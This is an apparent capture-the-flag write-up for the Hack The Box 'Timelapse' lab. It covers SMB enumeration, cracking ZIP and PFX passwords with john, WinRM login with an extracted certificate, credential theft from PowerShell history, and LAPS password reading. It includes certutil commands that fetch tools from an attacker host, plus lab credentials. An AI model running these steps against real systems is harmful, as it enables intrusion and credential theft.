# Timelapse - Easy

```sh
sudo vim /etc/hosts
# map IP to timelapse.htb

nmap -T4 -p- -A -Pn -v timelapse.htb
```

* open ports & services:

    * 53/tcp - domain - Simple DNS Plus
    * 88/tcp - kerberos-sec - Microsoft Windows Kerberos
    * 135/tcp - msrpc - Microsoft Windows RPC
    * 139/tcp - netbios-ssn - Microsoft Windows netbios-ssn
    * 389/tcp - ldap - Microsoft Windows Active Directory LDAP
    * 445/tcp - microsoft-ds
    * 464/tcp - kpasswd5
    * 593/tcp - ncacn_http - Microsoft Windows RPC over HTTP 1.0
    * 3268/tcp - ldap - Microsoft Windows Active Directory LDAP
    * 5986/tcp - ssl/http - Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    * 9389/tcp - mc-nmf - .NET Message Framing
    * 49667/tcp - msrpc - Microsoft Windows RPC

* ```nmap``` shows the domain names 'timelapse.htb' and 'dc01.timelapse.htb' - we can update the entries in ```/etc/hosts```

* it also reports a clock skew of around 8 hours, so we may have to correct the time if required (for kerberos)

* we can attempt general enumeration using ```enum4linux```:

    ```sh
    enum4linux timelapse.htb -A -C
    ```

* we can fix the clock skew first to match the server's time:

    ```sh
    sudo timedatectl set-ntp off
    # NTP off

    set rdate -n timelapse.htb
    # sync with target
    ```

* now we can attempt enumeration again just to ensure we were not hitting any clock-bound restrictions earlier:

    ```sh
    enum4linux timelapse.htb -A -C
    # this still did not work
    ```

* attempting manual enumeration and footprinting of open services:

    ```sh
    rpcclient -U '' -N timelapse.htb
    # null session connection works

    enumdomusers
    # NT_STATUS_ACCESS_DENIED
    ```

    ```sh
    smbclient -L \\\\timelapse.htb
    # lists shares
    # we have a non-default folder here

    smbclient \\\\timelapse.htb\\Shares
    # we can connect

    dir
    # two folders, we can check both

    cd Dev

    dir
    # we have a zip file that can be checked

    get winrm_backup.zip

    cd ..

    cd HelpDesk

    dir
    # we have a MSI file and a few documents, we can check these

    mget *
    # fetch all files
    ```

* we can check the files fetched from the shares

* the zip file is password-protected so we can try to crack it first:

    ```sh
    zip2john winrm_backup.zip > zip_hash

    john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash
    # this cracks it
    ```

* ```john``` cracks the ZIP password to 'supremelegacy' - we can use this to extract the 'legacyy_dev_auth.pfx' file inside it

* we can try to open the .pfx file but this is also requesting for a password - so we can use ```john``` to crack this:

    ```sh
    pfx2john legacyy_dev_auth.pfx > pfx_hash

    john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash
    # cracked
    ```

* ```john``` cracks the pfx hash to cleartext 'thuglegacy' - we can use this to open the pfx file now

* opening the pfx file by double-clicking on it shows that it contains a RSA key and a certificate

* Google shows that we can extract this using ```openssl```:

    ```sh
    openssl pkcs12 -in legacyy_dev_auth.pfx -out legacy.pem -nodes
    # extracts the certificates and private key into a single PEM file

    cat legacy.pem
    # this mentions 'CN=legacyy'

    openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacycert.pem
    # extracts only certificates

    openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out legacykey.pem
    # extracts only private key
    ```

* now, as we have the private key '.pem' file, and since the initial zip file mentioned the 'winrm' service, it is likely referring to the open 5986/TCP port for WinRM over HTTPS

* we can attempt to connect over WinRM using ```evil-winrm``` and the extracted private key:

    ```sh
    evil-winrm --help
    # we need to use the options to enable ssl
    # and use public key and private key certificate

    evil-winrm -i timelapse.htb -c legacycert.pem -k legacykey.pem -S
    # -c to use public key cert
    # -k to use private key
    # -S to enable SSL
    ```

* this works & we have shell as 'legacyy' user now:

    ```ps
    type C:\Users\legacyy\Desktop\flag.txt
    # user flag

    # initial enum using winpeas
    # fetch script

    certutil -urlcache -f http://10.10.14.21:8000/winPEASx64.exe winpeas.exe

    .\winpeas.exe
    ```

* findings from ```winpeas```:

    * box hostname is DC01, so it could be the DC in AD setup
    * user domain is 'TIMELAPSE'
    * LAPS is enabled
    * no AV detected
    * PS history file found at ```C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
    * AutoLogon creds found

* LAPS (Local Administrator Password Solution) is used to randomize & rotate local admin passwords so that it is not an easily guessable/fixed password

* checking for any cached creds according to ```winpeas```:

    ```ps
    # checking PS history file
    type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

    # alternate way to check
    type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
    ```

* from the PS console history file, we get cleartext creds 'svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV'

* the history file also provides the commands for 'svc_deploy' to connect over port 5986 (winRM) with SSL, and using the above creds - so we can connect in a similar way:

    ```sh
    evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -P 5986 -S
    # this works
    ```

* we have shell as 'svc_deploy' now:

    ```ps
    # we can attempt enum as winpeas again

    certutil -urlcache -f http://10.10.14.21:8000/winPEASx64.exe winpeas.exe
    
    .\winpeas.exe
    ```

* ```winpeas``` shows that this user is part of a non-standard group called 'LAPS_Readers' - we can check more on this:

    ```ps
    whoami /groups
    # shows the non-default group 'TIMELAPSE\LAPS_Readers'
    ```

* Googling on how to abuse LAPS and read LAPS password leads us to [this blog](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/)

* we can use tools such as [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) to abuse this feature:

    ```ps
    # fetch script from attacker

    certutil -urlcache -f http://10.10.14.21:8000/LAPSToolkit.ps1 LAPSToolkit.ps1

    Import-Module .\LAPSToolkit.ps1

    Get-LAPSComputers
    # this shows the computer name and password
    ```

* we can use this password to login as local admin on this box via ```evil-winrm``` using the same method as before:

    ```sh
    evil-winrm -i timelapse.htb -u administrator -p 'E}yI)KMhgv(efCkj6/i}xBjY' -P 5986 -S
    # this works
    ```

    ```ps
    dir C:\Users\Administrator\Desktop
    # we do not have the flag here

    dir C:\Users
    # we have another user TRX

    dir C:\Users\TRX\Desktop
    # we have root flag here

    type C:\Users\TRX\Desktop\root.txt
    # root flag
    ```
